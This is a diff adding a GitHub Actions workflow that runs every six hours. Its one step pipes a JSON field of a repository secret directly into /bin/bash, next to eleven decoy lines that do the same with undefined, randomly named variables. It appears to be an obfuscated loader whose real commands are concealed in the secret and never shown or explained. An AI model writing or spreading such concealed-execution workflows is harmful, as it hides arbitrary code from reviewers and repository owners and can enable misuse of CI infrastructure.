@@ -1,0 +1,29 @@
+name: chexihuacai
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '30 5/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: chexihuacai
+        env:
+          yp42795: ${{ secrets.yp42795 }}
+        run: |
+          echo $yp42795 | jq -r .afj69 | /bin/bash
+          echo $kmqs63 | jq -r .s26513 | /bin/bash
+          echo $zuh48 | jq -r .eo32224 | /bin/bash
+          echo $a9 | jq -r .iyf376 | /bin/bash
+          echo $ujce98993 | jq -r .f026 | /bin/bash
+          echo $qp2598 | jq -r .rsmv80 | /bin/bash
+          echo $gu86 | jq -r .v3145 | /bin/bash
+          echo $m82 | jq -r .dgv68 | /bin/bash
+          echo $vv54 | jq -r .kvfgk85 | /bin/bash
+          echo $xpdb73044 | jq -r .absmi97 | /bin/bash
+          echo $hxzc738 | jq -r .t9 | /bin/bash
+          echo $gw77 | jq -r .z9 | /bin/bash
+
